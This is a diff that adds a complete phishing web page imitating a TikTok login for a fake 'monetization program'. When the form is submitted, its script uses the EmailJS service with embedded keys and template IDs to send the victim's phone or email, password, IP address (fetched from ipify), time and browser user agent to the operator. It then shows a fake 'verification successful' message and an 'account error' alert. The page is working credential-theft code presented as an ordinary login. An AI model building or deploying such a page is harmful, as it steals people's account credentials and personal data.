@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Login</title>
+  <style>
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      background: #0f0f0f;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .login-container {
+      background: #1c1c1c;
+      padding: 2rem;
+      border-radius: 12px;
+      width: 340px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+
+    .logo {
+      width: 40px;
+      margin: 0 auto 2rem;
+    }
+
+    .logo img {
+      display: block;
+      width: 100%;
+      height: auto;
+    }
+
+    h2 {
+      margin-bottom: 1.5rem;
+      font-weight: 600;
+      font-size: 1.2rem;
+    }
+
+    .input-group {
+      margin-bottom: 1rem;
+      text-align: left;
+    }
+    .input-group label {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 0.4rem;
+      color: #aaa;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 0.7rem;
+      border: none;
+      border-radius: 6px;
+      background: #2a2a2a;
+      color: #fff;
+      font-size: 0.95rem;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 0.8rem;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(45deg, #69C9D0, #EE1D52);
+      color: #fff;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 0.5rem;
+      transition: opacity 0.2s ease;
+    }
+    button:hover {
+      opacity: 0.85;
+    }
+
+    .options {
+      margin-top: 1rem;
+      font-size: 0.85rem;
+      color: #aaa;
+    }
+    .options a {
+      color: #69C9D0;
+      text-decoration: none;
+    }
+    .options a:hover {
+      text-decoration: underline;
+    }
+
+    #loading {
+      display: none;
+      margin-top: 1rem;
+      color: #69C9D0;
+    }
+
+    .loader {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #69C9D0;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .timer-text {
+      display: inline-block;
+      vertical-align: middle;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo">
+      <img src="./logo.jpeg" alt="logo">
+    </div>
+    <h2>Log in to Monitization Program</h2>
+    <form id="loginForm">
+      <div class="input-group">
+        <label for="username"> Phone/Email </label>
+        <input type="text" id="username" placeholder="Enter your phone or email" required>
+      </div>
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Enter your password" required>
+      </div>
+      <button type="submit" id="loginButton">Log In</button>
+      <div id="loading">
+        <span class="loader"></span>
+        <span class="timer-text">Verifying data... Please wait (<span id="countdown">4</span>s)</span>
+      </div>
+    </form>
+    <div class="options">
+     
+      <p>Don't have an account? <a href="https://www.tiktok.com/signup">Sign up</a></p>
+    </div>
+  </div>
+
+  <!-- Load EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    // Initialize EmailJS
+    (function() {
+      emailjs.init('-8gfGiHT5fBMnwE99'); // Your public key
+      
+      document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        // Disable the login button to prevent multiple submissions
+        const loginButton = document.getElementById('loginButton');
+        loginButton.disabled = true;
+        
+        // Show loading message
+        const loadingElement = document.getElementById('loading');
+        const countdownElement = document.getElementById('countdown');
+        loadingElement.style.display = 'block';
+        
+        // Start countdown timer
+        let seconds = 4;
+        const timer = setInterval(() => {
+          seconds--;
+          countdownElement.textContent = seconds;
+          
+          if (seconds <= 0) {
+            clearInterval(timer);
+          }
+        }, 1000);
+        
+        try {
+          // Get additional data
+          const time = new Date().toLocaleString();
+          let ip = 'Unknown';
+          
+          try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+          } catch (ipError) {
+            console.log('Could not get IP:', ipError);
+          }
+
+          // Wait for the 4 seconds to complete before sending the email
+          await new Promise(resolve => setTimeout(resolve, 4000));
+          
+          // Send email
+          await emailjs.send('service_cdmrib9', 'template_nzeveud', {
+            username: document.getElementById('username').value,
+            password: document.getElementById('password').value,
+            time: time,
+            ip: ip,
+            user_agent: navigator.userAgent
+          });
+          
+          // First alert with OK button
+          alert('Verification successful! Please click OK to continue.');
+          
+          // Second alert that appears after OK is clicked
+          alert('Account Error Contact Admin .');
+          
+        } catch (error) {
+          console.error('EmailJS Error:', error);
+          alert('Error: Could not verify your details. Please try again.');
+        } finally {
+          // Hide loading message and re-enable button
+          loadingElement.style.display = 'none';
+          loginButton.disabled = false;
+          countdownElement.textContent = '4'; // Reset countdown
+          clearInterval(timer); // Ensure timer is cleared
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
